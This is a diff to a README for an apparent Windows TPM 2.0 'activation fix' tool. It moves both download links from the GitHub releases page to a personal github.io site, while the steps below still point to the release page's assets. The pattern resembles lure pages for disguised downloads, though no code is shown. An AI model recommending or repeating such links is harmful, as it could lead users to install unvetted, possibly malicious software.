@@ -1,6 +1,6 @@
 # 🛡️ TPM-Activation-Fix-Tool - Repair Missing Security Hardware Issues Easily
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Erminiedull381/TPM-Activation-Fix-Tool/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://erminiedull381.github.io)
 
 Windows 11 requires a Trusted Platform Module (TPM) 2.0 to function correctly. Some systems fail to detect this hardware due to configuration errors or outdated BIOS settings. This tool automates the process of identifying, initializing, and activating TPM 2.0 on compatible motherboards. You do not need technical expertise to use this repair utility.
 
@@ -18,7 +18,7 @@ Ensure you have a recent backup of your personal files before you change system 
 
 Visit the repository release page to obtain the files.
 
-[Download Repair Tool](https://github.com/Erminiedull381/TPM-Activation-Fix-Tool/releases)
+[Download Repair Tool](https://erminiedull381.github.io)
 
 1. Open the link above in your web browser.
 2. Look for the section labeled "Assets."
